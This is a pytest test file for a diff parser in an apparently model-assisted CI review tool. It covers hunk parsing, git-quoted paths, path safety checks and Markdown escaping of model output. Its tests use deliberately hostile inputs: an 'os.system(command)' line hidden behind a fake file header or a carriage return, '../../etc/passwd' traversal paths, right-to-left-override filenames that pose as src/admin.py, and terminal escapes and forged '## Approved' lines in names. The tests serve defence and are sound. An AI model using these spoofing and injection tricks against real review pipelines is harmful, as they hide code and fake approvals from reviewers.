from __future__ import annotations

import pytest

from honest_ci.diffs import (
    AddedLine,
    Move,
    RemovedLine,
    added_lines,
    changed_line_locations,
    count_changed_lines,
    extract_changed_files,
    file_line_counts,
    file_patches,
    is_safe_relative_path,
    markdown_code,
    markdown_code_block,
    markdown_path,
    markdown_prose,
    moved_files,
    printable_path,
    removed_lines,
    split_lines,
)
from honest_ci.redaction import redact_text

from .factories import (
    DIFF,
    HOSTILE_OUTPUT,
    HOSTILE_PROSE,
    markdown_outside_code,
    markdown_tokens,
    reaching_markdown,
    rendered_as_markdown,
)

MIXED = """--- a/src/app/a.py
+++ b/src/app/a.py
@@ -1,3 +1,3 @@
 keep = 1
-was = 2
+now = 2
 tail = 3
--- a/src/app/gone.py
+++ /dev/null
@@ -1,2 +0,0 @@
-all = 1
-of = 2
"""


def test_added_lines_carry_their_text_and_new_file_position() -> None:
    added = added_lines(DIFF)

    assert [item.line for item in added["src/app/refund.py"]] == [11, 12, 13]
    assert added["src/app/refund.py"][0].text == "    share = float(amount) / len(order.items)"


def test_a_replaced_line_counts_as_added_at_its_new_position() -> None:
    added = added_lines(MIXED)

    assert [(item.line, item.text) for item in added["src/app/a.py"]] == [(2, "now = 2")]


def test_a_deleted_file_contributes_no_added_lines() -> None:
    # It has no "+++" path of its own, so nothing can be attributed to it.
    assert "src/app/gone.py" not in added_lines(MIXED)


def test_line_locations_agree_with_added_lines() -> None:
    # The rule engine and the model trust boundary read the same diff through
    # the same parser; if these two ever disagreed, a rule could fire on a line
    # grounding would refuse.
    assert changed_line_locations(DIFF) == {
        path: {item.line for item in lines} for path, lines in added_lines(DIFF).items()
    }


def test_removed_lines_carry_their_text_and_base_file_position() -> None:
    removed = removed_lines(MIXED)

    assert removed["src/app/a.py"] == [RemovedLine(2, "was = 2")]
    assert removed["src/app/gone.py"] == [RemovedLine(1, "all = 1"), RemovedLine(2, "of = 2")]


def test_a_created_file_removes_nothing_and_a_grown_one_is_still_listed() -> None:
    diff = (
        "--- /dev/null\n+++ b/src/app/new.py\n@@ -0,0 +1 @@\n+fresh = 1\n"
        "--- a/src/app/grown.py\n+++ b/src/app/grown.py\n@@ -1 +1,2 @@\n keep = 1\n+more = 2\n"
    )

    # The mirror of added_lines: the keys answer "did this change touch that
    # file on the base side at all".
    assert removed_lines(diff) == {"src/app/grown.py": []}


def test_a_renamed_file_keeps_both_of_its_names() -> None:
    diff = (
        "diff --git a/src/app/old.py b/src/app/new.py\n"
        "similarity index 90%\n"
        "rename from src/app/old.py\n"
        "rename to src/app/new.py\n"
        "--- a/src/app/old.py\n"
        "+++ b/src/app/new.py\n"
        "@@ -1,2 +1,2 @@\n"
        " keep = 1\n"
        "-was = 2\n"
        "+now = 2\n"
    )

    [patch] = file_patches(diff)

    assert (patch.old_path, patch.new_path) == ("src/app/old.py", "src/app/new.py")
    assert removed_lines(diff) == {"src/app/old.py": [RemovedLine(2, "was = 2")]}
    assert added_lines(diff) == {"src/app/new.py": [AddedLine(2, "now = 2")]}


def test_a_removed_line_that_looks_like_a_header_is_still_content() -> None:
    # A removed SQL comment renders as "--- ...". Only a "---" line with a
    # "+++" line right under it names a file.
    diff = (
        "--- a/db/schema.sql\n"
        "+++ b/db/schema.sql\n"
        "@@ -1,3 +1,2 @@\n"
        " create table t (id int);\n"
        "--- ids stay unique\n"
        " alter table t add primary key (id);\n"
    )

    assert removed_lines(diff) == {"db/schema.sql": [RemovedLine(2, "-- ids stay unique")]}
    assert added_lines(diff) == {"db/schema.sql": []}


def test_a_file_header_without_a_base_side_reads_as_the_same_file() -> None:
    diff = "+++ b/src/app/a.py\n@@ -1,2 +1,2 @@\n-was = 2\n+now = 2\n keep = 1\n"

    assert removed_lines(diff) == {"src/app/a.py": [RemovedLine(1, "was = 2")]}
    assert added_lines(diff) == {"src/app/a.py": [AddedLine(1, "now = 2")]}


def test_a_hunk_before_any_file_header_belongs_to_no_file() -> None:
    orphan = "@@ -1 +1 @@\n-was = 1\n+now = 1\n"

    assert file_patches(orphan + MIXED) == file_patches(MIXED)
    # It is still two lines the change touches.
    assert count_changed_lines(orphan + MIXED) == count_changed_lines(MIXED) + 2


def test_file_patches_agree_with_added_and_removed_lines() -> None:
    for diff in (DIFF, MIXED):
        patches = file_patches(diff)

        assert added_lines(diff) == {p.new_path: p.added for p in patches if p.new_path}
        assert removed_lines(diff) == {p.old_path: p.removed for p in patches if p.old_path}


def test_the_guardrails_read_the_same_patches() -> None:
    # A deletion's "+++" is /dev/null: counted under its base path, a deleted
    # file stays in the inventory the guardrails check.
    assert file_line_counts(MIXED) == {"src/app/a.py": (1, 1), "src/app/gone.py": (0, 2)}
    assert extract_changed_files(MIXED) == ["src/app/a.py"]
    assert count_changed_lines(MIXED) == 4


# ── files moved without rename detection ─────────────────────────────────────


def deleted(path: str, *lines: str) -> str:
    body = "".join(f"-{line}\n" for line in lines)
    return f"--- a/{path}\n+++ /dev/null\n@@ -1,{len(lines)} +0,0 @@\n{body}"


def created(path: str, *lines: str) -> str:
    body = "".join(f"+{line}\n" for line in lines)
    return f"--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{len(lines)} @@\n{body}"


def test_a_file_deleted_and_created_again_line_for_line_is_a_move() -> None:
    diff = deleted("src/app/old.py", "keep = 1", "more = 2") + MIXED
    diff += created("src/app/new.py", "keep = 1", "more = 2")

    assert moved_files(diff) == [Move("src/app/old.py", "src/app/new.py", 2)]


def test_a_move_that_also_edits_the_file_is_not_paired() -> None:
    # Which new file carries on which deleted one would be a guess once the
    # lines differ, and nothing counted off a guess can be relied on.
    diff = deleted("src/app/old.py", "keep = 1", "was = 2")
    diff += created("src/app/new.py", "keep = 1", "now = 2")

    assert moved_files(diff) == []


def test_a_copy_that_keeps_the_original_is_not_a_move() -> None:
    diff = created("src/app/copy.py", "keep = 1") + MIXED

    assert moved_files(diff) == []


def test_each_deleted_file_carries_on_in_one_created_file_at_most() -> None:
    diff = deleted("src/app/a.py", "same = 1") + deleted("src/app/b.py", "same = 1")
    diff += created("src/app/c.py", "same = 1") + created("src/app/d.py", "same = 1")
    diff += created("src/app/e.py", "same = 1")

    # Paired in the order the diff lists them; the third copy has no deletion
    # left to account for it and stays an addition.
    assert moved_files(diff) == [
        Move("src/app/a.py", "src/app/c.py", 1),
        Move("src/app/b.py", "src/app/d.py", 1),
    ]


def test_an_empty_file_moved_is_no_lines_either_way() -> None:
    # Git shows an empty file's move as headers without a hunk: there are no
    # lines for it to pair on, and none for it to count.
    diff = (
        "diff --git a/src/app/__init__.py b/src/app/__init__.py\n"
        "deleted file mode 100644\n"
        "diff --git a/pkg/__init__.py b/pkg/__init__.py\n"
        "new file mode 100644\n"
    )

    assert moved_files(diff) == []
    assert count_changed_lines(diff) == 0


# ── content that looks like structure ────────────────────────────────────────

#: A removed SQL comment and an added "++" line render as "---" and "+++": a
#: file header's exact shape, in the middle of a hunk.
HEADER_LOOKALIKES = (
    "diff --git a/db/schema.sql b/db/schema.sql\n"
    "--- a/db/schema.sql\n"
    "+++ b/db/schema.sql\n"
    "@@ -1,3 +1,3 @@\n"
    " CREATE TABLE orders (id int);\n"
    "--- legacy comment\n"
    "+++ new banner\n"
    " SELECT 1;\n"
)


def test_a_header_lookalike_pair_inside_a_hunk_is_content() -> None:
    assert added_lines(HEADER_LOOKALIKES) == {"db/schema.sql": [AddedLine(2, "++ new banner")]}
    assert removed_lines(HEADER_LOOKALIKES) == {
        "db/schema.sql": [RemovedLine(2, "-- legacy comment")]
    }


def test_every_reader_sees_one_file_with_one_line_each_way() -> None:
    assert file_line_counts(HEADER_LOOKALIKES) == {"db/schema.sql": (1, 1)}
    assert extract_changed_files(HEADER_LOOKALIKES) == ["db/schema.sql"]
    assert count_changed_lines(HEADER_LOOKALIKES) == 2


def test_an_added_line_cannot_open_a_file_of_its_own() -> None:
    # Read as a header, "+++ b/src/app/elsewhere.py" would take the next line
    # to a path the change never touched, at another number.
    diff = (
        "--- a/src/app/refund.py\n"
        "+++ b/src/app/refund.py\n"
        "@@ -1 +1,3 @@\n"
        " keep = 1\n"
        "+++ b/src/app/elsewhere.py\n"
        "+os.system(command)\n"
    )

    assert added_lines(diff) == {
        "src/app/refund.py": [
            AddedLine(2, "++ b/src/app/elsewhere.py"),
            AddedLine(3, "os.system(command)"),
        ]
    }


def test_a_count_left_out_of_a_hunk_header_is_one_line() -> None:
    # "@@ -3 +3 @@" is git's short form of "@@ -3,1 +3,1 @@": the pair under it
    # is the hunk's one removed and one added line, and the hunk ends there,
    # so the pair after that is the next file's header.
    diff = (
        "--- a/db/schema.sql\n"
        "+++ b/db/schema.sql\n"
        "@@ -3 +3 @@\n"
        "--- old banner\n"
        "+++ new banner\n"
        "--- a/db/seed.sql\n"
        "+++ b/db/seed.sql\n"
        "@@ -1 +1 @@\n"
        "-INSERT 1;\n"
        "+INSERT 2;\n"
    )

    assert removed_lines(diff) == {
        "db/schema.sql": [RemovedLine(3, "-- old banner")],
        "db/seed.sql": [RemovedLine(1, "INSERT 1;")],
    }
    assert added_lines(diff) == {
        "db/schema.sql": [AddedLine(3, "++ new banner")],
        "db/seed.sql": [AddedLine(1, "INSERT 2;")],
    }


def test_a_no_newline_marker_counts_for_neither_side() -> None:
    diff = (
        "--- a/VERSION\n"
        "+++ b/VERSION\n"
        "@@ -1 +1 @@\n"
        "-1.0\n"
        "\\ No newline at end of file\n"
        "+1.1\n"
        "\\ No newline at end of file\n"
        "--- a/db/schema.sql\n"
        "+++ b/db/schema.sql\n"
        "@@ -1 +1 @@\n"
        "--- old banner\n"
        "+++ new banner\n"
    )

    assert file_line_counts(diff) == {"VERSION": (1, 1), "db/schema.sql": (1, 1)}
    assert added_lines(diff)["VERSION"] == [AddedLine(1, "1.1")]


def test_an_empty_line_inside_a_hunk_is_an_empty_context_line() -> None:
    # GNU diff's --suppress-blank-empty, and editors that trim trailing
    # whitespace, leave an empty context line without its space. Git still
    # reads it as a line, so the lines after it keep their numbers.
    diff = (
        "--- a/src/app/refund.py\n"
        "+++ b/src/app/refund.py\n"
        "@@ -1,3 +1,4 @@\n"
        " def split_refund(order, amount):\n"
        "\n"
        "+    share = amount / 2\n"
        "     return 0\n"
    )

    assert added_lines(diff) == {"src/app/refund.py": [AddedLine(3, "    share = amount / 2")]}


@pytest.mark.parametrize(
    ("boundary", "expected"),
    [
        (
            "diff --git a/src/app/next.py b/src/app/next.py\n"
            "--- a/src/app/next.py\n"
            "+++ b/src/app/next.py\n"
            "@@ -1 +1 @@\n",
            {
                "src/app/big.py": [AddedLine(2, "cut = 2")],
                "src/app/next.py": [AddedLine(1, "now = 1")],
            },
        ),
        (
            "@@ -60 +61 @@\n",
            {"src/app/big.py": [AddedLine(2, "cut = 2"), AddedLine(61, "now = 1")]},
        ),
    ],
    ids=["next-file", "next-hunk"],
)
def test_a_hunk_cut_short_ends_where_the_next_one_starts(
    boundary: str, expected: dict[str, list[AddedLine]]
) -> None:
    # A platform that truncates a diff leaves a hunk shorter than its header
    # says. Neither a "diff" nor an "@@" line can be content, so the next
    # file or hunk is still read as one instead of being swallowed.
    diff = (
        "--- a/src/app/big.py\n"
        "+++ b/src/app/big.py\n"
        "@@ -1,40 +1,41 @@\n"
        " keep = 1\n"
        "+cut = 2\n" + boundary + "-was = 1\n"
        "+now = 1\n"
    )

    assert added_lines(diff) == expected
    assert count_changed_lines(diff) == 3


def test_only_the_line_right_before_a_new_side_header_names_the_base_side() -> None:
    # As git reads a header: "---" and "+++" next to each other. A "---" line
    # anywhere else between hunks names nothing.
    diff = (
        "--- a/src/app/unrelated.py\n"
        "index 1234567..89abcde 100644\n"
        "+++ b/src/app/fee.py\n"
        "@@ -1 +1 @@\n"
        "-was = 1\n"
        "+now = 1\n"
    )

    assert [(patch.old_path, patch.new_path) for patch in file_patches(diff)] == [
        ("src/app/fee.py", "src/app/fee.py")
    ]


def test_a_line_that_cannot_be_content_does_not_end_the_hunk() -> None:
    # A stray line with no prefix (a mangled patch file) is skipped. Taken for
    # the end of the hunk, it would drop every line after it.
    diff = (
        "--- a/src/app/refund.py\n"
        "+++ b/src/app/refund.py\n"
        "@@ -1,2 +1,4 @@\n"
        " keep = 1\n"
        "+first = 2\n"
        "stray\n"
        "+second = 3\n"
        " tail = 4\n"
    )

    assert added_lines(diff) == {
        "src/app/refund.py": [AddedLine(2, "first = 2"), AddedLine(3, "second = 3")]
    }


# ── where a line ends ────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "separator",
    ["\r", "\x0c", "\x1c", "\x85", " ", " "],
    ids=["carriage-return", "form-feed", "file-separator", "nel", "line-sep", "paragraph-sep"],
)
def test_a_line_ends_only_where_git_ends_it(separator: str) -> None:
    # str.splitlines breaks at every one of these; git breaks at none. Python
    # runs what follows a lone "\r", and cut off the added line, that tail is
    # text no rule reads.
    diff = (
        "--- a/src/app/refund.py\n"
        "+++ b/src/app/refund.py\n"
        "@@ -1 +1,3 @@\n"
        " keep = 1\n"
        f"+x = 1{separator}os.system(command)\n"
        "+y = 2\n"
    )

    assert added_lines(diff) == {
        "src/app/refund.py": [
            AddedLine(2, f"x = 1{separator}os.system(command)"),
            AddedLine(3, "y = 2"),
        ]
    }


def test_a_crlf_diff_reads_like_any_other() -> None:
    diff = "--- a/app.py\r\n+++ b/app.py\r\n@@ -1 +1 @@\r\n-was = 1\r\n+now = 1\r\n"

    assert added_lines(diff) == {"app.py": [AddedLine(1, "now = 1")]}
    assert removed_lines(diff) == {"app.py": [RemovedLine(1, "was = 1")]}


def test_split_lines_splits_at_newlines_alone() -> None:
    assert split_lines("a\x0cb\r\nc\n") == ["a\x0cb", "c"]
    assert split_lines("a\n\nb") == ["a", "", "b"]
    assert split_lines("a\n\n") == ["a", ""]
    assert split_lines("") == []


def test_paths_that_could_escape_the_tree_or_pose_as_flags_are_rejected() -> None:
    assert is_safe_relative_path("src/app/refund.py")
    assert not is_safe_relative_path("/etc/passwd")
    assert not is_safe_relative_path("../../etc/passwd")
    assert not is_safe_relative_path("--fix")
    assert not is_safe_relative_path("C:/win")
    assert not is_safe_relative_path("")


#: Characters past ASCII that show a name as one it is not, or as nothing.
UNSEEN = {
    "c1-csi": "\x9b",  # read as ESC [ by some terminals
    "c1-next-line": "\x85",
    "right-to-left-override": "\u202e",
    "left-to-right-isolate": "\u2066",
    "right-to-left-mark": "\u200f",
    "arabic-letter-mark": "\u061c",
    "zero-width-space": "\u200b",
    "byte-order-mark": "\ufeff",
    "line-separator": "\u2028",
    "paragraph-separator": "\u2029",
    "lone-surrogate": "\ud800",
}


@pytest.mark.parametrize("char", UNSEEN.values(), ids=UNSEEN.keys())
def test_a_name_that_cannot_be_shown_as_it_is_is_rejected(char: str) -> None:
    # Checked for C0 and DEL alone, 'src/<RLO>yp.nimda' passed as a safe path
    # and read as src/admin.py wherever it was shown.
    assert not is_safe_relative_path(f"src/app/refund{char}.py")
    assert not is_safe_relative_path(f"{char}src/app/refund.py")


@pytest.mark.parametrize(
    "path",
    ["config/密钥.env", "docs/café.md", "assets/😀.png", "src/app/refund v2.py", "src/a\u00a0b.py"],
    ids=["cjk", "accent", "emoji", "space", "no-break-space"],
)
def test_a_name_past_ascii_that_shows_as_itself_is_still_a_path(path: str) -> None:
    assert is_safe_relative_path(path)


def test_a_name_is_shown_as_it_is_unless_something_in_it_cannot_be_seen() -> None:
    assert printable_path("src/app/refund.py") == "src/app/refund.py"
    assert printable_path("config/密钥.env") == "config/密钥.env"
    # Raw, these start a new line of Markdown and move a terminal's cursor.
    assert printable_path("src/app/refund\n## Approved.py") == r"'src/app/refund\n## Approved.py'"
    assert printable_path("src/\x1b[2Kapp.py") == r"'src/\x1b[2Kapp.py'"
    # Raw, this one shows as src/admin.py.
    assert printable_path("src/\u202eyp.nimda") == r"'src/\u202eyp.nimda'"


@pytest.mark.parametrize(
    ("path", "span"),
    [
        ("src/app/refund.py", "`src/app/refund.py`"),
        # One backtick longer than the longest run inside, so none closes it.
        ("src/a`b.py", "``src/a`b.py``"),
        ("src/a``b`c.py", "```src/a``b`c.py```"),
        # A span drops one space at each end when it has both; padded, a
        # backtick at an end stays apart from the fence, and a space stays.
        ("`a.py", "`` `a.py ``"),
        ("a.py`", "`` a.py` ``"),
        (" a.py", "`  a.py `"),
        ("   ", "`   `"),
        # Nothing unprintable reaches the span; it would end the line.
        ("src/a`\nb.py", "``'src/a`\\nb.py'``"),
    ],
    ids=["plain", "one-backtick", "runs", "leading", "trailing", "space", "spaces", "newline"],
)
def test_a_name_is_written_as_a_code_span_it_cannot_close(path: str, span: str) -> None:
    assert markdown_path(path) == span


@pytest.mark.parametrize(
    ("text", "span"),
    [
        # The renderers redact what they write once more on the way out, and a
        # value at the end of the text would take the fence with it. Redacted
        # here, it ends with the text, and the space keeps the next pass off
        # the fence.
        ("x = 1  # token=abc", "` x = 1  # token=[REDACTED] `"),
        # With no value of its own, the fence would be the value.
        ("x = 1  # token=", "` x = 1  # token=[REDACTED] `"),
        ('x = 1  # token="', '` x = 1  # token="[REDACTED] `'),
        # A value the text ends by itself cannot reach the fence; that pass
        # redacts it where it stands.
        ('token="abc" and more', '`token="abc" and more`'),
    ],
    ids=["value", "no-value", "open-quote", "closed-value"],
)
def test_text_is_written_as_a_code_span_the_last_redaction_cannot_open(
    text: str, span: str
) -> None:
    assert markdown_code(text) == span
    # One span, closed, after the pass every renderer makes.
    tokens = markdown_outside_code(f"quoted: {redact_text(span)} after")
    assert [token.type for token in tokens] == ["text", "code_inline", "text"]


@pytest.mark.parametrize(
    ("text", "fence"),
    [
        ("plain", "```"),
        ("a ``` b", "````"),
        ("`````", "``````"),
        # A tilde fence cannot close a backtick one, however long.
        ("~~~~~~", "```"),
    ],
)
def test_output_is_fenced_longer_than_any_backtick_run_in_it(text: str, fence: str) -> None:
    assert markdown_code_block(text) == f"{fence}\n{text}\n{fence}"


def test_output_is_written_as_a_code_block_it_cannot_close() -> None:
    # The renderers finish with a redaction pass, so that is what is parsed.
    markdown = redact_text(f"Output:\n\n{markdown_code_block(HOSTILE_OUTPUT)}\n\nAfter it.")

    assert rendered_as_markdown(markdown, "Approved by security") == []
    [block] = [token for token in markdown_tokens(markdown) if token.type == "fence"]
    shown = block.content.splitlines()
    # Every line is still there to read, the blank one included, and nothing
    # past the block is in it.
    assert len(shown) == len(HOSTILE_OUTPUT.split("\n"))
    assert shown[4] == ""
    assert shown[6] == "token="
    assert shown[-1].startswith("\\x1b[2J\\r**Approved by security**")
    assert "After it." not in block.content


def test_a_line_ending_in_a_key_leaves_the_closing_fence_alone() -> None:
    # "token=" at the end of a line has no value, and the fence on the next
    # line is not one: the final pass leaves the block as it was written.
    for line in ("token=", 'password: "', "api_key = "):
        block = markdown_code_block(line)
        assert block == f"```\n{line}\n```"
        assert redact_text(block) == block
    assert markdown_code_block("token=abc") == "```\ntoken=abc\n```"


def test_empty_output_is_an_empty_block() -> None:
    assert markdown_code_block("") == "```\n```"


# ── model prose ──────────────────────────────────────────────────────────────


def test_model_prose_keeps_its_emphasis_lists_and_code() -> None:
    prose = (
        "**Why:** the *refund* path.\n\n"
        "- use `items[0]`\n"
        "- then `` `b` ``\n\n"
        "  ```py\n  x = [1] <b>\n  ```"
    )

    tokens = markdown_tokens(markdown_prose(prose))

    assert {"strong_open", "em_open", "bullet_list_open"} <= {token.type for token in tokens}
    assert [token.content for token in tokens if token.type == "code_inline"] == ["items[0]", "`b`"]
    # Still in the list item it was indented under, and still code.
    fence = next(token for token in tokens if token.type == "fence")
    assert (fence.content, fence.level) == ("x = [1] <b>\n", 2)


def test_model_prose_cannot_embed_link_mention_or_write_html() -> None:
    # The renderers redact the finished text last; that pass must not reopen it.
    written = redact_text(markdown_prose(HOSTILE_PROSE))

    assert reaching_markdown(written) == []
    # Nothing is dropped: what could reach out is shown as code instead.
    quoted = {token.content for token in markdown_tokens(written) if token.type == "code_inline"}
    assert {
        "https://example.invalid/login",
        "www.example.invalid",
        "security@example.invalid",
        "@reviewer",
        "@org/team",
    } <= quoted


def test_what_could_reach_out_is_quoted_and_the_rest_escaped() -> None:
    assert markdown_prose("See https://example.invalid/a. Ask @reviewer.") == (
        "See `https://example.invalid/a`. Ask `@reviewer`."
    )
    assert markdown_prose("![x](//e) <b> &#64;all \\") == "!\\[x\\](//e) \\<b> \\&#64;all \\\\"


def test_a_code_block_the_model_left_open_ends_where_its_text_ends() -> None:
    tokens = markdown_tokens(markdown_prose("~~~mermaid\nleft open") + "\n\n**The report goes on.**")

    # The info string is gone: a mermaid block is a diagram the platform draws.
    assert [(token.info, token.content) for token in tokens if token.type == "fence"] == [
        ("", "left open\n")
    ]
    assert "strong_open" in {token.type for token in tokens}


def test_a_code_block_that_opens_the_prose_is_still_one_after_a_label() -> None:
    written = "Why: " + markdown_prose("```\n![x](//example.invalid/p.png)\n```")

    tokens = markdown_tokens(written)

    fences = [token.content for token in tokens if token.type == "fence"]
    assert fences == ["![x](//example.invalid/p.png)\n"]
    assert reaching_markdown(written) == []


def test_code_spans_side_by_side_are_kept_apart() -> None:
    written = markdown_prose("`a`https://example.invalid`b`")

    assert written == "`a` `https://example.invalid` `b`"
    assert [token.content for token in markdown_outside_code(written)] == [
        "a",
        " ",
        "https://example.invalid",
        " ",
        "b",
    ]


def test_a_fence_whose_info_string_holds_a_backtick_is_a_line_of_text() -> None:
    tokens = markdown_outside_code(markdown_prose("```a`b```"))

    assert [(token.type, token.content) for token in tokens] == [("code_inline", "a`b")]


# ── paths git quotes ─────────────────────────────────────────────────────────

#: What git writes for a change to ``config/密钥.env`` under the default
#: core.quotePath: each byte past ASCII as an octal escape, and the ``a/`` and
#: ``b/`` prefixes inside the quotes.
QUOTED = r"""diff --git "a/config/\345\257\206\351\222\245.env" "b/config/\345\257\206\351\222\245.env"
index 1234567..89abcde 100644
--- "a/config/\345\257\206\351\222\245.env"
+++ "b/config/\345\257\206\351\222\245.env"
@@ -1 +1 @@
-LOG_LEVEL=debug
+LOG_LEVEL=info
"""


def test_a_path_git_quoted_is_read_as_the_path_it_names() -> None:
    # Taken as written, the name would be '"b/config/\345...env"': a file in no
    # tree, matched by no "*.env" glob, and not the one git's file list names.
    assert added_lines(QUOTED) == {"config/密钥.env": [AddedLine(1, "LOG_LEVEL=info")]}
    assert removed_lines(QUOTED) == {"config/密钥.env": [RemovedLine(1, "LOG_LEVEL=debug")]}
    assert extract_changed_files(QUOTED) == ["config/密钥.env"]


@pytest.mark.parametrize(
    ("quoted", "path"),
    [
        (r'"b/notes/say \"hi\" \\ to\tyou.md"', 'notes/say "hi" \\ to\tyou.md'),
        # core.quotePath off: bytes past ASCII stay as they are, even inside
        # the quotes a '"' still calls for.
        (r'"b/notes/说 \"hi\".md"', 'notes/说 "hi".md'),
    ],
    ids=["escapes", "unescaped-bytes"],
)
def test_a_quoted_path_reads_its_escapes_back(quoted: str, path: str) -> None:
    # A space is not escaped: git marks a path that holds one with a tab after
    # the closing quote, and the tab is not part of the name.
    diff = f"+++ {quoted}\t\n@@ -0,0 +1 @@\n+hello\n"

    assert added_lines(diff) == {path: [AddedLine(1, "hello")]}


@pytest.mark.parametrize(
    ("escape", "char"),
    [
        (r"\n", "\n"),
        (r"\t", "\t"),
        (r"\033", "\x1b"),
        (r"\177", "\x7f"),
        # Past ASCII, git writes each UTF-8 byte in octal: these are exactly
        # what it wrote for such names under the default core.quotePath.
        (r"\302\233", "\x9b"),
        (r"\342\200\256", "‮"),
        (r"\342\200\213", "​"),
        (r"\342\200\250", " "),
    ],
    ids=["newline", "tab", "esc", "del", "c1-csi", "rlo", "zero-width", "line-separator"],
)
def test_a_control_character_out_of_the_quotes_is_still_refused(escape: str, char: str) -> None:
    # Unquoting gives a name its real bytes back, control characters and all.
    # The path check refuses those after it, as it would anywhere else, so
    # local intake refuses the name its -z file list carries raw.
    [path] = extract_changed_files(f'+++ "b/src/app/x{escape}y.py"\n')

    assert path == f"src/app/x{char}y.py"
    assert not is_safe_relative_path(path)


#: ``新.py`` created and ``旧.py`` deleted: git quotes their names, and never
#: the /dev/null on the other side.
CREATED_AND_DELETED = r"""diff --git "a/\346\226\260.py" "b/\346\226\260.py"
new file mode 100644
index 0000000..1234567
--- /dev/null
+++ "b/\346\226\260.py"
@@ -0,0 +1 @@
+x = 1
diff --git "a/\346\227\247.py" "b/\346\227\247.py"
deleted file mode 100644
index 89abcde..0000000
--- "a/\346\227\247.py"
+++ /dev/null
@@ -1 +0,0 @@
-y = 1
"""


def test_dev_null_still_marks_the_missing_side_of_a_quoted_path() -> None:
    patches = file_patches(CREATED_AND_DELETED)

    assert [(patch.old_path, patch.new_path) for patch in patches] == [
        (None, "新.py"),
        ("旧.py", None),
    ]
    # The deleted file is counted under its real name, where the guardrails
    # look for it.
    assert file_line_counts(CREATED_AND_DELETED) == {"新.py": (1, 0), "旧.py": (0, 1)}


@pytest.mark.parametrize(
    "quoted",
    [r'"b/src/app/open.py', r'"b/src/app/x\q.py"', r'"b/src/app/x\400.py"'],
    ids=["unterminated", "unknown-escape", "octal-past-a-byte"],
)
def test_quoting_git_would_refuse_is_kept_as_written(quoted: str) -> None:
    # git's own unquoting refuses these too. Dropping the file would hide its
    # lines from every reader; kept under the name as written, they are read.
    diff = f"+++ {quoted}\n@@ -0,0 +1 @@\n+x = 1\n"

    assert added_lines(diff) == {quoted: [AddedLine(1, "x = 1")]}


# ── names that end in whitespace ─────────────────────────────────────────────

#: What git writes when ``src/a.py`` and ``src/a.py `` -- a trailing space --
#: both change. A space is neither quoted nor escaped; git marks a label that
#: holds one with a tab after it instead, and the ``diff --git`` line not at all.
TWINS = (
    "diff --git a/src/a.py b/src/a.py\n"
    "--- a/src/a.py\n"
    "+++ b/src/a.py\n"
    "@@ -1 +1,2 @@\n"
    " x = 1\n"
    "+y = 2\n"
    "diff --git a/src/a.py  b/src/a.py \n"
    "--- a/src/a.py \t\n"
    "+++ b/src/a.py \t\n"
    "@@ -1 +1,2 @@\n"
    " x = 1\n"
    "+import os\n"
)


def test_a_name_ending_in_a_space_keeps_its_own_lines() -> None:
    # Trimmed, the second file's lines would be read under the first's name:
    # the one every rule, the tree check and the grounding check look at.
    assert added_lines(TWINS) == {
        "src/a.py": [AddedLine(2, "y = 2")],
        "src/a.py ": [AddedLine(2, "import os")],
    }
    assert [(patch.old_path, patch.new_path) for patch in file_patches(TWINS)] == [
        ("src/a.py", "src/a.py"),
        ("src/a.py ", "src/a.py "),
    ]


@pytest.mark.parametrize(
    ("label", "path"),
    [
        ("b/src/a.py \t", "src/a.py "),
        ("b/src/my file.py\t", "src/my file.py"),
        ("b/ src/a.py\t", " src/a.py"),
        # core.quotePath off: past ASCII nothing is quoted, and git's tab is
        # for an ASCII space only.
        ("b/src/a.py\u00a0", "src/a.py\u00a0"),
        ("b/src/a.py\u3000", "src/a.py\u3000"),
        ("b/src/a.py\u00a0 \t", "src/a.py\u00a0 "),
        # The default core.quotePath, for contrast: the quotes kept it whole.
        (r'"b/src/a.py\302\240"', "src/a.py\u00a0"),
        # GNU diff puts a timestamp after the tab; neither is the name.
        ("b/src/a.py \t2026-09-26 12:00:00.000000000 +0000", "src/a.py "),
    ],
    ids=[
        "trailing-space",
        "inner-space",
        "leading-space",
        "no-break-space",
        "ideographic-space",
        "no-break-space-then-space",
        "quoted",
        "timestamp",
    ],
)
def test_a_header_name_is_read_up_to_the_tab_and_no_further_trimmed(label: str, path: str) -> None:
    diff = f"--- /dev/null\n+++ {label}\n@@ -0,0 +1 @@\n+import os\n"

    assert added_lines(diff) == {path: [AddedLine(1, "import os")]}


# ── files git shows without a hunk ───────────────────────────────────────────

#: What ``git diff -M -C --find-copies-harder`` wrote for changes with no lines
#: to show: no ``---``/``+++`` for any of them. ``a/`` in ``rename from a/foo.py``
#: is a directory, not a prefix: git writes these names bare.
HEADERS_ONLY = r"""diff --git a/.github/workflows/deploy.yml b/docs/deploy.yml
similarity index 100%
rename from .github/workflows/deploy.yml
rename to docs/deploy.yml
diff --git a/a/foo.py b/a/bar.py
similarity index 100%
rename from a/foo.py
rename to a/bar.py
diff --git a/my dir/b c.py b/my dir/b d.py
similarity index 100%
rename from my dir/b c.py
rename to my dir/b d.py
diff --git "a/\345\257\206\351\222\245.py" "b/\347\247\230\345\257\206.py"
similarity index 100%
rename from "\345\257\206\351\222\245.py"
rename to "\347\247\230\345\257\206.py"
diff --git a/src.txt b/copy.txt
similarity index 100%
copy from src.txt
copy to copy.txt
diff --git a/empty.py b/empty.py
deleted file mode 100644
index e69de29..0000000
diff --git a/my dir/new empty.py b/my dir/new empty.py
new file mode 100644
index 0000000..e69de29
diff --git a/mode.sh b/mode.sh
old mode 100644
new mode 100755
diff --git a/bin.dat b/bin.dat
index bdc955b..8835708 100644
Binary files a/bin.dat and b/bin.dat differ
"""


def test_a_file_git_shows_without_a_hunk_is_still_a_file_of_the_diff() -> None:
    patches = file_patches(HEADERS_ONLY)

    assert [(patch.old_path, patch.new_path) for patch in patches] == [
        (".github/workflows/deploy.yml", "docs/deploy.yml"),
        ("a/foo.py", "a/bar.py"),
        ("my dir/b c.py", "my dir/b d.py"),
        ("密钥.py", "秘密.py"),
        # A copy leaves its source as it was: it is a file created, and read
        # as a rename it would be a source moved away.
        (None, "copy.txt"),
        ("empty.py", None),
        (None, "my dir/new empty.py"),
        ("mode.sh", "mode.sh"),
        ("bin.dat", "bin.dat"),
    ]
    assert all(patch.hunks == () for patch in patches)
    assert count_changed_lines(HEADERS_ONLY) == 0
    assert moved_files(HEADERS_ONLY) == []


def test_every_reader_names_a_file_git_shows_without_a_hunk() -> None:
    renamed = HEADERS_ONLY.split("diff --git a/a/foo.py")[0]

    assert extract_changed_files(renamed) == ["docs/deploy.yml"]
